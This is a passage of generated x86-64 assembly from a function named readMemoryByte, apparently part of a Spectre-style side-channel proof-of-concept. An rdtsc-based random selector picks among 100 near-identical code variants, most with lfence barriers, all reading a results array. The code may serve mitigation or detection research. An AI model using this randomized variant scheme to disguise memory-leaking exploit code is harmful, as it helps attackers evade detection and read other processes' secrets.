	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 45
.LreadMemoryByte_win1_var45:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 46
.LreadMemoryByte_win1_var46:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 47
.LreadMemoryByte_win1_var47:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 48
.LreadMemoryByte_win1_var48:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 49
.LreadMemoryByte_win1_var49:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 50
.LreadMemoryByte_win1_var50:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 51
.LreadMemoryByte_win1_var51:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 52
.LreadMemoryByte_win1_var52:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 53
.LreadMemoryByte_win1_var53:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 54
.LreadMemoryByte_win1_var54:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 55
.LreadMemoryByte_win1_var55:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 56
.LreadMemoryByte_win1_var56:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 57
.LreadMemoryByte_win1_var57:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 58
.LreadMemoryByte_win1_var58:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 59
.LreadMemoryByte_win1_var59:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 60
.LreadMemoryByte_win1_var60:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 61
.LreadMemoryByte_win1_var61:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 62
.LreadMemoryByte_win1_var62:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 63
.LreadMemoryByte_win1_var63:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 64
.LreadMemoryByte_win1_var64:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 65
.LreadMemoryByte_win1_var65:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 66
.LreadMemoryByte_win1_var66:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 67
.LreadMemoryByte_win1_var67:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 68
.LreadMemoryByte_win1_var68:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 69
.LreadMemoryByte_win1_var69:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 70
.LreadMemoryByte_win1_var70:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 71
.LreadMemoryByte_win1_var71:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 72
.LreadMemoryByte_win1_var72:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 73
.LreadMemoryByte_win1_var73:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 74
.LreadMemoryByte_win1_var74:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 75
.LreadMemoryByte_win1_var75:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 76
.LreadMemoryByte_win1_var76:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 77
.LreadMemoryByte_win1_var77:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 78
.LreadMemoryByte_win1_var78:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 79
.LreadMemoryByte_win1_var79:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 80
.LreadMemoryByte_win1_var80:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 81
.LreadMemoryByte_win1_var81:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 82
.LreadMemoryByte_win1_var82:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 83
.LreadMemoryByte_win1_var83:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 84
.LreadMemoryByte_win1_var84:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 85
.LreadMemoryByte_win1_var85:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 86
.LreadMemoryByte_win1_var86:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 87
.LreadMemoryByte_win1_var87:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 88
.LreadMemoryByte_win1_var88:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 89
.LreadMemoryByte_win1_var89:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 90
.LreadMemoryByte_win1_var90:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 91
.LreadMemoryByte_win1_var91:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 92
.LreadMemoryByte_win1_var92:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 93
.LreadMemoryByte_win1_var93:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 94
.LreadMemoryByte_win1_var94:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 95
.LreadMemoryByte_win1_var95:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 96
.LreadMemoryByte_win1_var96:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 97
.LreadMemoryByte_win1_var97:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 98
.LreadMemoryByte_win1_var98:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 99
.LreadMemoryByte_win1_var99:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
.LreadMemoryByte_win1_continue:
	addq	$32, %rsp
	subq	$32, %rsp
## RANDOM SELECTOR BLOCK
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$100, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.LreadMemoryByte_win0_var0
	cmpl	$1, %eax
	je	.LreadMemoryByte_win0_var1
	cmpl	$2, %eax
	je	.LreadMemoryByte_win0_var2
	cmpl	$3, %eax
	je	.LreadMemoryByte_win0_var3
	cmpl	$4, %eax
	je	.LreadMemoryByte_win0_var4
	cmpl	$5, %eax
	je	.LreadMemoryByte_win0_var5
	cmpl	$6, %eax
	je	.LreadMemoryByte_win0_var6
	cmpl	$7, %eax
	je	.LreadMemoryByte_win0_var7
	cmpl	$8, %eax
	je	.LreadMemoryByte_win0_var8
	cmpl	$9, %eax
	je	.LreadMemoryByte_win0_var9
	cmpl	$10, %eax
	je	.LreadMemoryByte_win0_var10
	cmpl	$11, %eax
	je	.LreadMemoryByte_win0_var11
	cmpl	$12, %eax
	je	.LreadMemoryByte_win0_var12
	cmpl	$13, %eax
	je	.LreadMemoryByte_win0_var13
	cmpl	$14, %eax
	je	.LreadMemoryByte_win0_var14
	cmpl	$15, %eax
	je	.LreadMemoryByte_win0_var15
	cmpl	$16, %eax
	je	.LreadMemoryByte_win0_var16
	cmpl	$17, %eax
	je	.LreadMemoryByte_win0_var17
	cmpl	$18, %eax
	je	.LreadMemoryByte_win0_var18
	cmpl	$19, %eax
	je	.LreadMemoryByte_win0_var19
	cmpl	$20, %eax
	je	.LreadMemoryByte_win0_var20
	cmpl	$21, %eax
	je	.LreadMemoryByte_win0_var21
	cmpl	$22, %eax
	je	.LreadMemoryByte_win0_var22
	cmpl	$23, %eax
	je	.LreadMemoryByte_win0_var23
	cmpl	$24, %eax
	je	.LreadMemoryByte_win0_var24
	cmpl	$25, %eax
	je	.LreadMemoryByte_win0_var25
	cmpl	$26, %eax
	je	.LreadMemoryByte_win0_var26
	cmpl	$27, %eax
	je	.LreadMemoryByte_win0_var27
	cmpl	$28, %eax
	je	.LreadMemoryByte_win0_var28
	cmpl	$29, %eax
	je	.LreadMemoryByte_win0_var29
	cmpl	$30, %eax
	je	.LreadMemoryByte_win0_var30
	cmpl	$31, %eax
	je	.LreadMemoryByte_win0_var31
	cmpl	$32, %eax
	je	.LreadMemoryByte_win0_var32
	cmpl	$33, %eax
	je	.LreadMemoryByte_win0_var33
	cmpl	$34, %eax
	je	.LreadMemoryByte_win0_var34
	cmpl	$35, %eax
	je	.LreadMemoryByte_win0_var35
	cmpl	$36, %eax
	je	.LreadMemoryByte_win0_var36
	cmpl	$37, %eax
	je	.LreadMemoryByte_win0_var37
	cmpl	$38, %eax
	je	.LreadMemoryByte_win0_var38
	cmpl	$39, %eax
	je	.LreadMemoryByte_win0_var39
	cmpl	$40, %eax
	je	.LreadMemoryByte_win0_var40
	cmpl	$41, %eax
	je	.LreadMemoryByte_win0_var41
	cmpl	$42, %eax
	je	.LreadMemoryByte_win0_var42
	cmpl	$43, %eax
	je	.LreadMemoryByte_win0_var43
	cmpl	$44, %eax
	je	.LreadMemoryByte_win0_var44
	cmpl	$45, %eax
	je	.LreadMemoryByte_win0_var45
	cmpl	$46, %eax
	je	.LreadMemoryByte_win0_var46
	cmpl	$47, %eax
	je	.LreadMemoryByte_win0_var47
	cmpl	$48, %eax
	je	.LreadMemoryByte_win0_var48
	cmpl	$49, %eax
	je	.LreadMemoryByte_win0_var49
	cmpl	$50, %eax
	je	.LreadMemoryByte_win0_var50
	cmpl	$51, %eax
	je	.LreadMemoryByte_win0_var51
	cmpl	$52, %eax
	je	.LreadMemoryByte_win0_var52
	cmpl	$53, %eax
	je	.LreadMemoryByte_win0_var53
	cmpl	$54, %eax
	je	.LreadMemoryByte_win0_var54
	cmpl	$55, %eax
	je	.LreadMemoryByte_win0_var55
	cmpl	$56, %eax
	je	.LreadMemoryByte_win0_var56
	cmpl	$57, %eax
	je	.LreadMemoryByte_win0_var57
	cmpl	$58, %eax
	je	.LreadMemoryByte_win0_var58
	cmpl	$59, %eax
	je	.LreadMemoryByte_win0_var59
	cmpl	$60, %eax
	je	.LreadMemoryByte_win0_var60
	cmpl	$61, %eax
	je	.LreadMemoryByte_win0_var61
	cmpl	$62, %eax
	je	.LreadMemoryByte_win0_var62
	cmpl	$63, %eax
	je	.LreadMemoryByte_win0_var63
	cmpl	$64, %eax
	je	.LreadMemoryByte_win0_var64
	cmpl	$65, %eax
	je	.LreadMemoryByte_win0_var65
	cmpl	$66, %eax
	je	.LreadMemoryByte_win0_var66
	cmpl	$67, %eax
	je	.LreadMemoryByte_win0_var67
	cmpl	$68, %eax
	je	.LreadMemoryByte_win0_var68
	cmpl	$69, %eax
	je	.LreadMemoryByte_win0_var69
	cmpl	$70, %eax
	je	.LreadMemoryByte_win0_var70
	cmpl	$71, %eax
	je	.LreadMemoryByte_win0_var71
	cmpl	$72, %eax
	je	.LreadMemoryByte_win0_var72
	cmpl	$73, %eax
	je	.LreadMemoryByte_win0_var73
	cmpl	$74, %eax
	je	.LreadMemoryByte_win0_var74
	cmpl	$75, %eax
	je	.LreadMemoryByte_win0_var75
	cmpl	$76, %eax
	je	.LreadMemoryByte_win0_var76
	cmpl	$77, %eax
	je	.LreadMemoryByte_win0_var77
	cmpl	$78, %eax
	je	.LreadMemoryByte_win0_var78
	cmpl	$79, %eax
	je	.LreadMemoryByte_win0_var79
	cmpl	$80, %eax
	je	.LreadMemoryByte_win0_var80
	cmpl	$81, %eax
	je	.LreadMemoryByte_win0_var81
	cmpl	$82, %eax
	je	.LreadMemoryByte_win0_var82
	cmpl	$83, %eax
	je	.LreadMemoryByte_win0_var83
	cmpl	$84, %eax
	je	.LreadMemoryByte_win0_var84
	cmpl	$85, %eax
	je	.LreadMemoryByte_win0_var85
	cmpl	$86, %eax
	je	.LreadMemoryByte_win0_var86
	cmpl	$87, %eax
	je	.LreadMemoryByte_win0_var87
	cmpl	$88, %eax
	je	.LreadMemoryByte_win0_var88
	cmpl	$89, %eax
	je	.LreadMemoryByte_win0_var89
	cmpl	$90, %eax
	je	.LreadMemoryByte_win0_var90
	cmpl	$91, %eax
	je	.LreadMemoryByte_win0_var91
	cmpl	$92, %eax
	je	.LreadMemoryByte_win0_var92
	cmpl	$93, %eax
	je	.LreadMemoryByte_win0_var93
	cmpl	$94, %eax
	je	.LreadMemoryByte_win0_var94
	cmpl	$95, %eax
	je	.LreadMemoryByte_win0_var95
	cmpl	$96, %eax
	je	.LreadMemoryByte_win0_var96
	cmpl	$97, %eax
	je	.LreadMemoryByte_win0_var97
	cmpl	$98, %eax
	je	.LreadMemoryByte_win0_var98
	cmpl	$99, %eax
	je	.LreadMemoryByte_win0_var99
	jmp	.LreadMemoryByte_win0_var0
## Variant 0
.LreadMemoryByte_win0_var0:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 1
.LreadMemoryByte_win0_var1:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 2
.LreadMemoryByte_win0_var2:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 3
.LreadMemoryByte_win0_var3:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 4
.LreadMemoryByte_win0_var4:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 5
.LreadMemoryByte_win0_var5:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 6
.LreadMemoryByte_win0_var6:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 7
.LreadMemoryByte_win0_var7:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 8
.LreadMemoryByte_win0_var8:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 9
.LreadMemoryByte_win0_var9:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 10
.LreadMemoryByte_win0_var10:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 11
.LreadMemoryByte_win0_var11:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 12
.LreadMemoryByte_win0_var12:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 13
.LreadMemoryByte_win0_var13:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 14
.LreadMemoryByte_win0_var14:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 15
.LreadMemoryByte_win0_var15:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 16
.LreadMemoryByte_win0_var16:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 17
.LreadMemoryByte_win0_var17:
	popq	%rax
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
